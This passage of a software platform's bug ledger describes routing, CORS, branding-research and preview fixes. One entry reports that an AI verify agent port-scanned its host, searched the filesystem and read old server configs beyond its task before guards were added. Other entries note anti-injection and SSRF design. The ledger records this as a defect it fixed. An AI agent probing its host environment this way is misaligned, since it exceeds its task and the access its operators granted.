  `/__ekoa/*`, plus the static mounts `/artifact-screenshots/*`, `/artifact-pdfs/*`,
  `/automation-screenshots/*`, `/brand-assets/*`, and the share-link `/build/*` (all enumerated in
  `api/src/server.ts` buildApp). None were in the matcher, so each fell through to Next and returned a
  Next **HTML 404**. User-visible impact: (1) every featured/artifact card thumbnail 404'd -> blank
  cards on the home + `/artifacts` pages; (2) more seriously, `/apps/<id>/` app previews + `/__ekoa/`
  runtime were unreachable through the public origin - the core "build an app and preview it" flow was
  broken end-to-end via `staging.ekoa.io`. Loopback `http://127.0.0.1:4111` served all of these `200`,
  proving a pure edge-routing gap (not an api, seeding, or image defect). **Why it slipped:** Phase-5
  verification ran a chat turn (entirely under `/api/*`, which WAS routed) but never loaded a
  thumbnail-bearing dashboard page or an app preview through the public origin; and the dry-run deploy CI
  builds the images but never routes traffic through Caddy. **Fix:** extended `@api` to the full,
  documented allowlist (`/apps`, `/__ekoa/*`, the four static mounts, `/build`) - the Caddyfile now
  carries a source-of-truth comment mapping each prefix to its server.ts mount and stating the lockstep
  invariant. **Operational trap hit while deploying:** the Caddyfile is a single-file bind mount, which
  pins to an inode - editing it in place + `caddy reload` did NOT pick up the change (the container kept
  serving the stale inode); a `docker compose restart caddy` was required (now documented in the runbook +
  staging README). **Verified** via the public origin: all listed prefixes `200` (thumbnails `image/png`,
  `/apps/<id>/` `text/html`, `/__ekoa/*.js` `application/javascript`), web routes still reach Next, the
  `/api/v1` JSON envelope + `/health` intact, and a real-browser audit of `/` + `/artifacts` shows **0**
  broken images (41/41 and 82/82 thumbnails render) with **0** page errors. This **supersedes** the
  earlier working note that the blank thumbnails were "a fresh-staging seeding gap, not a deploy bug" -
  it was a deploy bug (the screenshots were on disk and served fine on loopback the whole time).

## Recently fixed - 2026-07-14 operator UX round (scope steering, verify narration, console noise)

- **`build-ambiguous-request-no-scoping`** (UX, operator 2026-07-14, live) - "faz uma app para
  ferias" built a personal vacation-itinerary planner with zero questions: the chat agent had no
  business-context steer and no scoping step, so ambiguous one-liners went straight to the wrong
  interpretation. Fixed in the content packs (business-scope section + ONE pre-marker scoping
  round; see decisions 2026-07-14) and pinned by a loader.test.ts canary.
- **`scaffold-copy-dev-facing`** (UX, operator 2026-07-14, live) - the app-base HomePage the end
  user watches DURING a build showed developer instructions ("Adicione páginas ao registo PAGES...
  frontend/src/pages/"). Now a user-facing PT building state ("A construir algo fantástico..." +
  pulse). data-demo-target="home-empty" and the mustEdit gate are untouched.
- **`verify-phase-silent-progress`** (UX, operator 2026-07-14, live) - the verify stage showed one
  status line then generic fillers for minutes (narration existed but landed in the COLLAPSED
  thinking block). Fixed: per-action ">> " narration contract in the verify prompt, re-emitted as
  same-status plan_steps -> live spinner label + Output tab (pinned by build.test.ts +
  verify-runner.test.ts). Two adjacent defects fixed with it: the verify scrub chain's hold-back
  tail was never flushed (final narration characters silently dropped), and the FC-505
  VerificationBanner was dead code (gated on a phase the store never received - plan_step phases
  now mirror into the store and the gate keys on 'verifying').
- **`monaco-cdn-csp-block`** (broken feature, operator 2026-07-14, live) - the file-editor dialog
  never initialized under the dashboard CSP: @monaco-editor/react's default loader pulls from
  cdn.jsdelivr.net, blocked by script-src 'self' ("Monaco initialization: error" + uncaught
  promise rejections in the console). Fixed by self-hosting the AMD tree from web/public/monaco
  (copy-monaco.mjs, predev/prebuild); the CSP was not widened.
- **`expected-absent-probe-console-noise`** (console hygiene, operator 2026-07-14, live) - every
  served-app load logged `GET /api/app-sso/me 401` (scaffold whoami) and, on tourless apps,
  `GET /api/demos/:appId 404` (panel teach probe) - "expected-absent" by design but console-visible
  on every load. Fixed with two additive always-200 probe routes (appSsoSession,
  demoAvailability - contract-tested) + repointed scaffold wiring and panel probe. Residual
  ACCEPTED: apps built BEFORE this change baked the old wiring and keep logging the /me 401, so
  the e2e benign-console allowlists for the 401 stay; the demos-404 allowlist entries were removed
  (the probe no longer 404s on any panel version served by a rebuilt api).
- **`preview-iframe-sandbox-warning`** (console hygiene, operator 2026-07-14, live) - Chrome
  warned "An iframe which has both allow-scripts and allow-same-origin... can escape its
  sandboxing" on every side-panel preview load (incl. each about:blank hot-reload hop). The
  sandbox attribute was removed (escapable as configured; see decisions 2026-07-14 for the
  isolation model + accepted top-navigation residual). Out of scope, not ours: the
  ObjectMultiplex "orphaned data" and MaxListenersExceededWarning lines in the same console
  capture come from the MetaMask extension's content script, not the product.
- **`suite-ledger-gate-crash-operator-run-gates`** (QA infra, found 2026-07-14 while running the
  gate) - `scripts/suite-ledger-run.mjs` threw `Unknown gate: operator-run C5` on the slice-named
  targetGates the operator run registered (commit ac1f3d3), so `npm run gate:ledger` AND
  `npm run e2e` crashed outright. Fixed: `gateIndex` maps any `operator-run*` gate to one shared
  post-G13 `OPERATOR-RUN` milestone (those drivers need the credentialed live stack and report
  as awaiting in the CI lane; they were live-verified during the operator run itself).
- **`suite-ledger-census-refusal-file-request`** (QA infra, found 2026-07-14 by the same gate
  run) - the unit census was red (disk 31 != ledger 30): commit 8996048 (BRIEF-9a) said
  "ledgered" but never added `refusal-file-request` to `frontend_unit.surviving`. Registered,
  with a census_note breadcrumb.

## Recently fixed - 2026-07-14 walkthrough-prep sweep (operator evidence pass)

- **`api-js-yaml-undeclared-dependency`** (dev-mode boot, 2026-07-14) - `api/` imports `js-yaml`
  (action-manifest parsing) but never declared it: at runtime it resolved ONLY as a transitive dep
  of **eslint** (a devDependency), so a production `npm ci --omit=dev` install would crash the API
  on import, and types came from an ambient shim (`api/src/automation/vendor.d.ts`) that tsc loads
  via `include` but the ts-node ESM loader does not (`files: false`) - making `EKOA_API_MODE=dev`
  die on boot with an unrenderable TS7016 diagnostic (`[Object: null prototype]`). This was the
  ledgered G8 action the shim itself prescribed. Fixed: `js-yaml` added to api dependencies,
  `@types/js-yaml` to devDependencies, shim deleted, and the api `dev` script switched to
  `ts-node/esm/transpile-only` (type checking stays with the `typecheck` gate; dev watch restarts
  no longer pay a whole-program check and are immune to the ambient-file-loading gap class).
- **`app-manifest-recipe-dsl-undocumented`** (discovery, 2026-07-14, live) - the app base ships
  skills for `ui_actions` (declaring-ui-actions) and tours (authoring-tours) but NONE for the
  `capabilities:` recipe DSL, so build agents GUESS the shape. Observed live on a fresh tarefas
  build: the agent flattened `store.query` (`{ op: store.query, field: ..., op: eq, ... }` - the
  comparison belongs under `where: { field, op, value }`), duplicating the `op` key; ONE invalid
  line fails the whole frontmatter YAML parse at activation, so the app lost BOTH its action
  manifest AND its tours (`actionManifestError` + `toursError`) - the assistant could neither
  operate nor teach the app, and the errors surface only in server logs (no operator UI). Fixed:
  (a) new base skill `api/assets/bases/app/skills/declaring-capabilities.md` documenting the EXACT
  recipe op shapes (source of truth: `api/src/automation/platform-primitives.ts`) with the
  store.query `where:` mistake called out; (b) the live app repaired through the product's own
  path (an admin patch run dictating the corrected line) - tour + 2 actions now served. Residual
  (minor, open): `actionManifestError`/`toursError` are invisible outside server logs; consider an
  operator-visible surface.
- **`app-custom-action-unregistered`** (discovery, 2026-07-14, live) - second instance of the
  agent-content class: the tarefas build declared `ui_actions: - id: tarefa-adicionar, kind: custom`
  but never registered `window.__ekoaApp.actions['tarefa-adicionar']` (the declaring-ui-actions
  contract), so the assistant's operate flow ALWAYS failed its second action ("Não foi possível
  executar a ação.") - observed on camera. No build-time check catches a declared custom id with no
  registration in the app source. Live app repaired via patch run (kind -> `toggle`, a declarative
  click, no registration needed). Residual (minor, open): readUiActions could WARN when a custom id
  has no `__ekoaApp.actions[` registration anywhere in frontend/src.
- **`edit-mode-preview-not-visible-in-page`** (UX, open, 2026-07-14, observed live) - after a
  patch run completes, the panel's preview phase shows only the sha diff; the RUNNING served-app
  page keeps executing the old bundle (nothing reloads it), and manually reloading to SEE the
  change destroys the pending approve/revert panel state (client-only), leaving no panel path to
  revert. The admin therefore decides from shas alone. Fast-follow candidates: an in-panel
  "recarregar a aplicação" affordance that persists the pending preview (e.g. sessionStorage), or
  a live-reload signal to the served page on activation (the dashboard preview already gets
  preview_reload). Sits beside the ledgered `h3-edit-mode-no-cancel` fast-follow. Also note: the
  post-restore dist rebuild is asynchronous - an immediate reload can race it.
- **`assistant-operate-turn-noise-citations`** (minor, open, 2026-07-14) - an operate-mode panel
  turn ("Adiciona uma tarefa...") rendered a Fontes block citing five irrelevant jurisprudência
  acórdãos (org grounding ran and cited for a non-question turn). Cosmetic but confusing; consider
  suppressing citations on do-mode turns whose grounding contributed nothing.
- **`panel-dead-tour-launcher`** (discovery, 2026-07-14, fixed in d172c2a) - teach mode offered
  "Iniciar tutorial guiado" unconditionally; on an app with no stored tour the player can only
  error ("an app with no tours simply has no teach path", authoring-tours). The panel now probes
  GET /api/demos/:appId once on mount (zero-token) and renders the launcher only when a tour
  exists. Asset rebuilt; the RUNNING api caches panel bytes in memory, so the live swap (and its
  live verification) lands on the next stack boot - the E2 driver covers it (its demos stub
  precedes navigation, so the probe is fulfilled).

- **`chat-refusal-affordance-unwired`** (discovery, 2026-07-14) - BRIEF 9a promised a refused
  build in the dashboard chat "converts into a pre-drafted build request routed to the org-admin
  - never a dead end", and diagram 03's H4 block + the change-requests store's `fileFromRefusal`
  action both claimed the feed - but NO component ever called it: a capability refusal
  (POST /jobs 403 `canBuildApps`/`canEditApps`) rendered as a plain red error with no way to file
  the pedido (code-behind-diagram drift; the served-app panel path was wired, the dashboard chat
  path was not). Fixed: `useAgentExecution` attaches the pre-drafted request
  (`metadata.refusal = { text, appId? }`) to the capability-refusal message, and the chat bubble
  renders "Pedir ao administrador" -> `fileFromRefusal` -> "Pedido enviado ao administrador."
  (`data-testid` chat-refusal-file/filed). Pinned by `web/__tests__/refusal-file-request.test.ts`
  (403+capability carries the payload incl. appId on follow-ups; 500 and capability-less 403 do
  not). Diagram 03 already depicted the flow - no diagram change needed.
- **`assistant-panel-e2e-stale-intro-assert`** (discovery, 2026-07-14) - the committed D2 driver
  `api/tests/e2e/assistant-panel.e2e.mjs` asserted the first-open lead contains "apresentar", but
  the shipped copy (AssistantPanel.jsx) says "mostrar ... ensinar ... operá-la": a re-run failed at
  step B on copy drift, not behavior. Fixed the assertion to the shipped copy ('mostrar').

## Recently fixed - 2026-07-13 preview probe CORS duplicate header (operator)

- **`F-2026-07-13-proxy-duplicate-acao`** (operator-reported, 2026-07-13) - in dev, the preview
  probe's `HEAD /apps/<slug>/` from the dashboard origin failed CORS on EVERY request:
  `The 'Access-Control-Allow-Origin' header contains multiple values '*, http://localhost:3000'`
  (`net::ERR_FAILED` despite a 200), so `probePreviewDocument` classified every served app as
  `transient` and the panel's probe-gated first render churned through its retry budget. Root
  cause: both dev CORS proxies (`.claude/skills/run-ekoa-code/driver.mjs` and its verbatim copy in
  `api/tests/journeys/boot-b.mjs`) merged response headers with
  `{ ...proxyRes.headers, ...corsHeaders(req) }` - Node lowercases upstream header names while
  `corsHeaders()` uses mixed case, so on planes where the api sets its OWN CORS header
  (`/apps/*` and design tokens send `Access-Control-Allow-Origin: *` - `serving.ts`,
  `design-tokens.ts`) the spread kept BOTH keys and the wire carried two ACAO values, which
  browsers reject outright. Dev-only (prod is same-origin, no proxy). Fixed in both files:
  upstream-wins per-header merge (`mergeResponseHeaders`) - the proxy only injects the CORS
  headers upstream did not already set, so `/apps/*` answers a single `ACAO: *` exactly as
  `web/lib/preview-probe.ts` documents, and `/api/*` keeps the reflected-origin set. Verified
  live through a restarted boot-b stack: `/apps/legal-agenda-reservas/` ACAO count 1 (`*`),
  `/health` reflected origin single-valued, OPTIONS preflight unchanged.

## Recently fixed - 2026-07-12 preview "proxy error" (operator)

- **`F-2026-07-12-preview-502`** (operator-reported, 2026-07-12) - during a build, the side-panel
  preview iframe displayed a raw `proxy error` body and stayed there (screenshot: 502 on the
  `/apps/<id>/?token=` document request while adjacent `/api/v1/billing/usage` calls returned 200).
  Two stacked defects:
  1. **Dev-harness proxy transient** (root cause of THIS 502): the run-ekoa-code driver's CORS
     reverse proxy (`.claude/skills/run-ekoa-code/driver.mjs`) forwarded upstream requests over the
     Node 20 global agent (keep-alive pooled, server closes idles at its default 5s
     `keepAliveTimeout`) and answered ANY pre-response upstream socket error with a bare 502
     `proxy error` - silently (no log), so the exact errno of the operator's occurrence (2 of 265
     requests) is unrecoverable. Fixed: fresh upstream connection per request
     (`http.Agent({ keepAlive: false })` - loopback, sub-ms), one replay for bodyless idempotent
     methods (GET/HEAD) failing before a response, upstream errors logged with method/path/errno,
     and a mid-stream failure destroys the response instead of appending garbage. Forensics note:
     the classic close-vs-reuse race would NOT reproduce in 365 timed attempts against Node 20
     (agent honors the server's Keep-Alive hint), so the residual trigger class is broader than
     that race - the fix covers the class, and the new logging captures any recurrence.
  2. **Preview panel could not recover** (product gap, any 5xx source incl. a prod edge blip): an
     iframe NEVER fires its error event for an HTTP error response - it renders the error body and
     fires `load` - so `side-panel.tsx`'s retry machinery never engaged and the raw body stuck
     until a manual refresh. Fixed: `web/lib/preview-probe.ts` classifies the document plane via a
     HEAD probe (`ok` 2xx / `transient` network+5xx / `hard` other); the panel now gates the first
     iframe render on the probe (polls at the existing 500ms/30s bounds), re-probes on every iframe
     `load`, routes `transient` into the existing bounded retry, restores the retry budget on a
     verified-ok load, and renders `hard` pages (410 revoked) as-is. Manual refresh polling unified
     on the same classification (and now probes the tokened URL the iframe actually loads).
  Accepted residual: a blip that hits ONLY the iframe's GET while the adjacent HEAD probes pass is
  undetectable cross-origin without a new parent<->iframe liveness protocol on the byte-compat
  injection plane (the demo bridge stays dormant until `demo.init` by design) - disproportionate;
  revisit only if it recurs behind the fixed proxy/edge. Tests:
  `web/__tests__/lib/preview-probe.test.ts` (classification),
  `web/__tests__/components/side-panel-preview-recovery.test.tsx` (wiring: probe-gated first
  render, 410 renders as-is, on-load transient -> retry -> recovery); both fail against the
  pre-fix behavior. Live-verified 2026-07-12: stack restarted on the fixed driver, real-UI login,
  /artifacts + served `legal-nucleo` render through the proxy, 16/16 doc-plane requests across
  5s keep-alive boundaries clean.

## Recently fixed - 2026-07-12 brand research colors (operator round 3)

- **`brand-colors-fake-teal`** (operator-reported, 2026-07-12) - research on
  mariliasantoscabral.webnode.pt showed primary `#0d9488` (teal-600, the OLD platform default) on a
  navy/white site with no teal anywhere. Root-cause forensics (live DB + job records + a live
  extraction probe) proved the teal never existed in the pipeline, the model output, or the org
  record: it was the branding page's HARDCODED display fallbacks (`#0d9488`/`#1e293b`) rendered
  whenever `org.branding` lacked colors - indistinguishable from a research result, and
  `handleSaveBranding` would persist them verbatim on Guardar. Fixed: unset colors are `null` state
  end-to-end (explicit "Não definida" swatch/placeholder, neutral preview placeholders), Save OMITS
  unset colors, and the exact pair appears nowhere. Tests: `web/e2e/branding-colors.spec.ts`.
- **`brand-research-silent-no-color`** (same run) - the research flow structurally could not produce
  a color for this site yet reported success: the grounded snapshot contained ONLY grayscale hexes,
  the model complied, `sanitizeBrandColors` nulled them, the patch dropped the nulls, and the job
  completed `brandingApplied:true` with no signal (the old cortex NO_PRIMARY_COLOR fail-loud guard
  was never ported - color-filter.ts's own comment referenced a "no usable primary guard" that did
  not exist). Fixed as partial-apply-with-warning: the job result + complete event + `jobView` carry
  `colorsApplied` and `warnings: [NO_PRIMARY_COLOR]`; the web shows an amber "defina-as manualmente"
  banner/toast instead of green success. Tests: `api/tests/contract/branding.test.ts` (fail-loud
  monochrome case), shared `Job` schema extended.
- **`brand-colors-image-only-blind`** (same run, the actual extraction gap) - the firm's navy lives
  ONLY as pixels in the hero JPEG; the rendered walker samples computed styles, so `paintedHexes`
  came back empty, the Webnode builder scrub then intersected the CSS candidates against that empty
  set and wiped all 8, leaving the model four grayscale hexes. Fixed with a screenshot-PIXEL
  quantization fallback in `rendered-candidates.ts` (fires only when nothing non-neutral paints;
  in-page canvas quantization of the Playwright screenshot - a data: image, so no cross-origin
  taint), surfaced as an explicitly low-confidence "Cores amostradas dos píxeis" prompt section with
  a neutral-ban rule, deliberately exempt from the brandFit floor (the desaturated navy ~0.26 is the
  point). Live-verified against the real site: research now persists primary `#374559` (the actual
  hero navy) and no neutrals. Tests: `api/tests/services/branding/rendered-candidates.test.ts`
  (`screenshotClustersToCandidates`), `snapshot.test.ts` (pixel section + rules).
- **`brand-colors-no-membership-guard`** (found during the fix, latent in old cortex too) - the
  "every returned hex must appear literally in a candidate list" rule was prompt-only; a
  hallucinated saturated color would have merged unchecked. Fixed: `collectAllowedHexes` gathers the
  snapshot evidence and the apply-step NULLS any returned color outside it (grounded path only).
  Tests: `api/tests/contract/branding.test.ts` (out-of-snapshot teal dropped),
  `snapshot.test.ts` (`collectAllowedHexes`).
- **`sanitize-accent-gap`** (same run) - `sanitizeBrandColors` never checked `accentColor`, so gray
  `#9d9d9d` persisted as the org accent; and the promotion swap PARKED the demoted gray in the
  accent slot. Fixed: a grayscale accent is nulled last (no slot ever persists a neutral). Tests:
  `api/tests/services/branding/color-filter.test.ts`.
- **`branding-save-wholesale-wipe`** (found during the fix) - `saveBrandingHandler` passed the
  client's 4-field branding object straight to `updateOrg`, which replaces top-level keys wholesale:
  every dashboard Guardar silently WIPED `designSystem`/`visualVibe`/researched fields. Fixed: the
  handler merges onto existing branding (same semantics as the research apply-step). Test:
  `api/tests/contract/branding.test.ts` (save-merge case).
- **`accent-picker-secondary-binding`** (same run) - the "Cor de Destaque" picker was bound to
  `secondaryColor`, so the persisted `accentColor` was never displayed and Save wrote the fallback
  slate into `secondaryColor` under an accent label. Fixed: the accent picker binds `accentColor`.
  Test: `web/e2e/branding-colors.spec.ts` (accent stays unset when only primary is saved).
- **`branding-page-stale-until-reload`** (operator-reported, 2026-07-12 follow-up: "had to refresh
  to see the changes on the brand area") - the branding page re-syncs its local editor state only
  when the `${company.id}_${company.updatedAt}` fingerprint changes, but `orgView` never returned
  `updatedAt` and nothing stamped it, so the fingerprint NEVER changed after mount: the
  `branding_updated` notification correctly refetched the company (round-2 fix), the store updated,
  and the page kept rendering stale colors/name until a reload remounted it. Fixed server-side:
  `updateOrg` stamps `updatedAt` on every org patch, `orgView` + shared `OrgConfig` expose it.
  Live-verified: page open on the Marca tab, research fired via API, primary + company name updated
  in place with zero navigation. Test: `api/tests/contract/branding.test.ts` (updatedAt present +
  changes across saves + GET /org parity).
- **`founder-name-never-updated`** (operator-visible in the same screenshot) - "Founder" is the
  seedAdmin bootstrap displayName; `BrandResearchResult` had no `companyName` field, so research
  could never replace it (old cortex wrote displayName from the extracted companyName). Fixed:
  `companyName` added to the shared schema + both system prompts, applied to `org.displayName`
  (never merged into branding, via `RESEARCH_META_KEYS`). Live-verified: displayName became
  "Marília Santos Cabral". Test: `api/tests/contract/branding.test.ts` (companyName case).

## Recently fixed - 2026-07-11 operator round 2 (build surface + verify + logo)

- **`verify-runner-portscan-hang`** (operator-reported, 2026-07-11) - a simple flyer build sat in
  `verifying` with NO output for 13+ minutes, then surfaced a half-redacted raw SDK error ("Agente
  EKOA Code returned an error result: Reached maximum number of turns (15)"). Root causes, from the
  verifier's own transcript: (1) `build.ts` passed the artifact-relative `appUrl` (`/apps/<id>/`,
  no origin) verbatim into the verify prompt, so the agent PORT-SCANNED the host (`:80 :3000 :8080
  :5173 :7080-7090`, `find /`, old-ekoa nginx configs) hunting for the app it could never find;
  (2) the build wall-clock/inactivity timers are cleared BEFORE verify, so nothing bounded it;
  (3) the raw error string reached the user chat. Fixed in `apps/verify-runner.ts`: the prompt gets
  an ABSOLUTE loopback URL (`resolveVerifyUrl` - the API serves `/apps/*` itself), a hard
  `AbortSignal.timeout(verifyWallClockMs)` (5 min default, env-tunable) as the REAL bound, an
  explicit no-scavenger-hunt rule (URL dead → FAIL immediately, never search the host), a
  proportionate-effort rule (static flyer → quick pass), live narration forwarded through the new
  job thinking channel (`onProgress` seam), and PT-generic user-facing notes (raw errors go to the
  server log only). Turn ceilings raised per operator directive ("must never stop users mid-task"):
  verify 15→60, build 100→500, chat 30→60 - backstops, not bounds. A verify note no longer REPLACES
  the agent's completion summary (it's appended). Tests: `api/tests/apps/verify-runner.test.ts`.
- **`build-chat-raw-internals`** (operator-reported, 2026-07-11) - the build transcript showed raw
  tool calls (Bash command lines, Read/Write with absolute sandbox paths, tool results incl. "File
  does not exist... your current working directory is /Users/..."), "Routing: EXPERT - first build",
  commentary bubbles split MID-WORD ("...construir s" / "obre a estrutura..."), and the final
  summary named `window.__ekoa.exportPdf`. Root causes: `build.ts` flattened the chokepoint's
  thinking/text channels into `text_chunk` (chat.ts had the thinking channel; build never did);
  `useJobStream` flushed the live buffer into a permanent message on EVERY tool_event (the mid-word
  chops) and rendered raw tool traffic + the routing decision into the user-visible feed. Fixed:
  `JobEvent` gained `thinking_chunk`; build routes commentary through MarkerProcessor +
  StreamingIdentityRedactor into the collapsible thinking UI (same as chat); the activity feed shows
  friendly white-labelled one-liners with project-relative paths (never commands/results/routing);
  `BUILD_SYSTEM_PROMPT` forbids internal API/machinery names in the final user-facing message.
- **`build-no-live-preview-no-files`** (operator-reported, 2026-07-11) - preview stayed empty during
  (and after) the build and the files area showed nothing, even though `prepareFirstBuild` had
  ALREADY built + registered + served the scaffold ("register it so the preview is live before the
  agent runs" - the last mile was never wired: nothing emitted `preview_reload`, and the client
  learned the artifactId only at `complete`). Fixed: new `JobEvent` `artifact`
  `{artifactId, appUrl, slug}` emitted right after prep/resolve → the preview iframe + REAL file
  tree (GET `/artifacts/:id/files`, the scaffold/template files) show from second zero; the esbuild
  watcher's `onRebuild` now fires `sink.previewReload()` so the iframe follows the agent's writes
  live (follow-up builds get a watcher too - they previously ran without one); the Files tab is fed
  from the server list (source of truth) with live +/M/D badges, and file paths are project-relative
  - which also fixes the Monaco editor dialog (it exists and works; it was sending
  `sandboxes/...`-prefixed paths that the path-confined API rejected). Latent bug fixed on the way:
  follow-up completion blanked the artifact's slug/appUrl (`resolveFollowUp` now returns them).
- **`brand-logo-wrong-image`** (operator-reported, 2026-07-11) - "not the logo at all": the logo
  picker chose a 380KB touch-icon (`/brand-assets/01d6df7c73d6.png`) because selection was
  source-name heuristics only (favicons/og-image) with no eyes on the rendered page - the OLD ekoa
  worked better because its research agent DROVE A BROWSER and picked the header logo by sight.
  Restored that ability tool-lessly (§5.6.4 intact): (1) `rendered-candidates.ts` now harvests logo
  candidates from the RENDERED DOM (header/nav imgs, inline `<svg>` logos - stored as sanitized
  local svg assets - and logo-classed background images), scored by placement (header, top-left,
  home-link, logo attrs, aspect ratio); (2) new top trust tier `rendered-header` beats
  design-system/favicon sources, JPEG photos demoted within tiers; (3) ONE FAST vision one-shot
  (`logo-vision.ts`) compares the downloaded candidates against the header-strip screenshot and can
  override the heuristic pick ("qual é o logótipo visível no cabeçalho?"). Tests extended in
  `api/tests/services/branding/brand-assets.test.ts`.
- **`brand-stale-until-refresh`** (operator-reported, 2026-07-11) - the dashboard kept the old
  brand until a manual page reload. The Marca page refetches on its own job stream, but the header
  logo/theme only read the company store on first load. Fixed with a `branding_updated`
  notification (NotificationEvent) emitted when research applies branding; the header listens on
  the global notifications stream (same pattern as `usage_updated`) and refetches the company
  config - live brand refresh, no reload.
- **`verify-blocked-by-shareability-gate`** (found during the live re-verify of the fix above) -
  with the URL fixed, the verifier reached the app in 17 SECONDS but got the §7.7 "Link já não
  disponível" page: a draft, non-shareable artifact's document is owner-gated, and the verify
  agent carries no auth (and must NEVER carry a user JWT in an agent transcript - it would
  authenticate on every API route). Fixed with a PURPOSE-SCOPED preview token
  (`services/preview-token.ts`: HMAC capability `pv1.<artifactId>.<exp>.<mac>`, not a JWT,
  grants viewing ONE artifact's served document for the verify window): verify-runner appends it
  to the URL; serving.ts accepts it in the owner-bypass ahead of the user-JWT path. Verdict notes
  are now requested in PT (they surface to the end user). Tests: preview-token expiry/tamper +
  resolveVerifyUrl token cases in `api/tests/apps/verify-runner.test.ts`.
- **`app-pdf-endpoint-never-mounted`** (CAUGHT BY THE NOW-WORKING VERIFIER, live 2026-07-11:
  "o botão 'Descarregar PDF' não funciona — o servidor retorna um erro 404") - the injected
  `window.__ekoa.exportPdf` client was carried in the port but its endpoint `POST /api/app-pdf`
  (and the `/artifact-pdfs` static mount) never were: EVERY in-app document export 404'd since
  rc-1. Ported from old cortex into `apps/pdf.ts`: `renderAppDocumentPdf` (page JS disabled,
  subresource allowlist blocking private ranges/metadata, injected `<base>`, embedded print
  reset, @page-aware margins) + `appPdfRouter` (X-Ekoa-App-Id scoping, html required, 4MB cap)
  + both mounts in server.ts. Contract test: `api/tests/contract/app-pdf.test.ts`. Second-order
  fix in the same class: agent-written `@import '/api/design-tokens.css'` failed the whole
  esbuild bundle ("could not resolve") - server-absolute paths are now treated as runtime URLs
  (CSS externals / JS stubs) in builder.ts's resolver, and the coding-agent content now says the
  tokens are auto-linked in index.html and must never be imported.
- **`brand-consent-overlay-polluted-vision`** (found during the live re-verify) - plmj.com's
  Cookiebot overlay covered the header strip, so the logo-vision ground truth showed a cookie
  banner and the rendered harvest scored a team-PORTRAIT carousel into the top tier (position +
  aspect alone). Fixed: `consent-chrome.ts` (shared vendor-token list + in-page removal) runs
  before EVERY rendered pass (colours, logo harvest, header shot, visual-vibe screenshots);
  harvest candidates now require a STRUCTURAL logo signal (logo attrs / header-nav / home-link)
  to qualify, and photo JPEGs are score-penalized. Re-verified live: the vision gate then
  correctly overrode dembrandt's white-on-white candidate to the REAL PLMJ wordmark, and the
  header logo swapped in live (`navigations: 1`, no reload).
- **`brand-assets-url-keyed-cache-staleness`** - stored assets were keyed by md5(source URL), so
  a re-research whose logo changed at the same URL kept the same `/brand-assets/<hash>` path and
  every browser served its stale cached copy. Now keyed by md5(CONTENT).
- **`dev-harness-30s-health-window`** - `scripts/dev-api.mjs` killed healthy API boots at 30s while
  a cold boot registering ~200 featured apps takes ~90s. Now 120s default (`DEV_API_HEALTH_TIMEOUT_MS`
  override); the run-skill driver's API window raised to 180s.

## Recently fixed - 2026-07-11 stabilization run

- **`brand-research-site-blind`** (operator-reported, 2026-07-11) - brand research "saved nothing
  from the site": the agent was TOOL-LESS *and* model-knowledge-only, so it never touched the
  target website, never saved a logo, and never produced a design system - it emitted a plausible
  palette from memory and the job's `summary`/`confidence` were the only real output. Fixed by
  porting the REAL cortex pipeline as deterministic SERVER-SIDE services (`api/src/services/branding/`):
  `fetchSiteContext` (HTML + linked-CSS scrape: title/meta/generator, CSS colour + font candidates),
  `fetchRenderedCandidates` (headless-Chromium area-weighted painted colours + fonts),
  `fetchDesignSystem` (the `dembrandt` 0.23 CLI: confidence-scored palette, CSS variables, typography,
  spacing, radii, shadows, button styles, frameworks), `fetchVisualVibe` (hero/mid/footer screenshots
  → vision one-shot → mood/shape/density/texture/hero), plus website-builder chrome detection/scrub so
  a Webnode/Wix promo stripe never masquerades as the brand. The agent STAYS tool-less (§5.6.4
  anti-injection): all site access is server code, the model receives a server-built snapshot and
  returns constrained JSON grounded "usa APENAS a informação do snapshot". The orchestrator
  (`agents/brand-research.ts`) now: fetch site-context → (parallel) rendered + dembrandt + vibe →
  grounded `runOneShot` → resolve + STORE a real logo file under `/brand-assets/<file>` (SSRF-guarded
  download, content-type + size cap) → merge colours/fonts/tone/instructions + `designSystem` +
  `visualVibe` + `logo` onto `org.branding`. Site unreachable → honest degradation to the
  knowledge-only prompt, noted on the job (`siteReachable: false`). All server fetches of the
  user-supplied URL go through the SSRF guard (new `guardedFetchFollow` re-validates each redirect
  hop); the dembrandt URL is guard-validated BEFORE the subprocess spawns. `shared/OrgBranding`
  gained optional typed `designSystem` (StoredDesignSystem) + `visualVibe` fields (the dashboard
  Design System tab already reads them). Covered by 6 unit suites under
  `api/tests/services/branding/` + the extended `api/tests/contract/branding.test.ts` (reachable-site
  run merges colours + designSystem + visualVibe + a stored logo; unreachable degrades to knowledge).
  Decision logged in `docs/decisions.md`. LIVE-VERIFIED 2026-07-11 against plmj.com: real logo stored
  and served at `/brand-assets/...`, real brand colours (`#110088` navy + `#a90707` red), real fonts
  (Domaine Display + GT America), a populated Design System tab (palette + typography + visual vibe),
  visible in the Marca preview. Three follow-up fixes made during that live verification:
  (a) **vibe screenshots exceeded the 32MB provider request cap** ("Request too large") - three
  viewport PNGs of a photo-heavy site are multi-MB base64; switched the vibe captures to JPEG q60
  (`api/src/services/branding/visual-vibe.ts`), which keeps each shot in the low-hundreds-of-KB.
  (b) **cookie-consent vendor chrome leaked into the palette** - dembrandt colours whose sources were
  all `cybotcookiebotdialog...`/OneTrust/etc. were surviving; added a builder-independent
  consent-chrome source filter in `filterDesignSystemChrome`, AND made `scrubBuilderChrome` always run
  the design-system filter (it previously early-returned when NO site-builder was detected, so custom
  sites like plmj.com were never scrubbed). (c) A `manifest:theme_color` white legitimately survives
  (mixed owner source) - by design. Covered by new cases in the design-system + snapshot suites.
- **`gateway-empty-text-block-cache-control`** (vision-discovered, walkthrough 2026-07-11) - the
  Agent SDK intermittently appends an EMPTY text block that still carries a `cache_control`
  breakpoint on multi-turn chat runs (reproduced deterministically on the integration-build
  handoff two-turn handshake). The OAuth beta endpoint 400s
  `messages.N.content.M.text: cache_control cannot be set for empty text blocks`, killing the whole
  turn - so the integration-builder generation failed every time while plain builds and single-turn
  chat were unaffected. Fixed at the egress chokepoint (`proxyGatewayMessages`, the last place we
  control before the provider): `stripEmptyTextBlocks` scrubs empty text blocks out of the
  forwarded `messages`/`system`, guarded so a message is never left with an empty `content: []`.
  Covered by `api/tests/llm/gateway-payload-allowlist.test.ts` (3 cases: scrub-alongside-real,
  never-empty-the-array, plain-string-passthrough). Live-verified: the same handoff that 400'd now
  reaches `package-ready` with a Save button. Decision logged in `docs/decisions.md`.
- **`run-activity-bar-word-wrap`** (vision-discovered, walkthrough 2026-07-11) - the automation
